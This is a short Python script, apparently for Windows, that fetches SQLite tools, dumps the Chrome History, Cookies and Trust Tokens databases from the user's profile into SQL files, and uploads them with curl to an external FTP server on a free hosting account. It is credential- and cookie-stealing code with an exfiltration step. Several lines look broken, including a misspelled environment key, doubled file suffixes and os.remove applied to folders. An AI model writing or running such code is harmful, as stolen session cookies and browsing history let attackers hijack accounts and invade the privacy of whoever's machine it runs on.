import os
import wget
import zipfile
import shutil
from dotenv import load_dotenv
global USERNAME,PASSWORD

value = dict(os.environ)
home = value["HOMEDRIVE"]+value["HOMEPATH"]

#update with all copy database type files
path = ["\AppData\Local\Google\Chrome\User Data\Default\History - Copy.db","\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies - Copy.db","\AppData\Local\Google\Chrome\User Data\Default\History\Network\Trust Tokens - Copy.db"]
#update with all sql type files
output = ["History.sql","cookies.sql","TrustTokens.sql"]

load_dotenv()
USERNAME,PASSWORD = os.getenv("FPT_USERNAME"),os.getenv("FTP_PASSWORD")

def sqlite_download():
    x=0
    url1 = wget.download("https://www.sqlite.org/2022/sqlite-dll-win32-x86-3390200.zip")
    url2 = wget.download("https://www.sqlite.org/2022/sqlite-tools-win32-x86-3390200.zip")
    zipfilename = ["sqlite-dll-win32-x86-3390200.zip","sqlite-tools-win32-x86-3390200.zip"]
    filename = ["sqlite-dll-win32-x86-3390200","sqlite-tools-win32-x86-3390200"]
    for i in range(len(zipfilename)):
        with zipfile.ZipFile(os.getcwd()+"\\"+zipfilename[i], 'r') as zip_ref:
            zip_ref.extractall(r"C:\sqlite")
        zip_ref.close()
    os.chdir("C:\\sqlite\\"+filename[0])
    while True:
        files = os.listdir()
        if x == len(files):
            os.remove("C:\\sqlite\\"+filename[0])
            x=0
            os.chdir("C:\\sqlite\\"+filename[1])
        elif not os.listdir("C:\\sqlite\\"+filename[0]) and not os.listdir("C:\\sqlite\\"+filename[1]):
            break
        elif x != len(files):
            shutil.move("C:\\sqlite\\"+files[x],"C:\\sqlite")
            x+=1
    os.remove("C:\\sqlite\\"+filename[1])
    return

def sql_database():
    os.chdir(r"c:\sqlite")
    for i in range(len(path)):
        with open(r"c:\sqlite\sql_commands.txt","w") as txtfile:
            txtfile.write(f".output {output[i]}")
            txtfile.write("\n.dump")
            txtfile.write("\n.exit")
        os.system(fr'sqlite3 "{home}{path[i]} - Copy.db" < sql_commands.txt')

def upload_database():
    os.chdir("C:\\sqlite")
    lst2 = os.listdir()
    lst = []
    for l in range(len(lst2)):
        cur = lst2[l]
        if cur[-3:] == "sql":
            lst.append(cur)
    for i in range(len(lst)):
        os.system(f"curl -v -u {USERNAME}:{PASSWORD} -T C:\\sqlite\\{lst[i]} ftp://epiz_32211127@ftpupload.net/htdocs/SQLUPLOAD/")

sql_database() 